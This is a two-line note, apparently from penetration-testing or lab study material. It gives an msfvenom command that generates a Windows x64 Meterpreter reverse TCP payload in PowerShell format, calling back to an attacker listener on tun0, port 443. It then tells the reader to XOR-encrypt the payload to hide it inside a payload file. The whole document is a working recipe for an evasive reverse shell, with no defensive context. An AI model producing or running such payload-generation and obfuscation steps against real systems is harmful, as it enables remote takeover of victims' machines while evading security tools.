```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f powershell```
Then, ecnrypt with Xor and implement in payload.
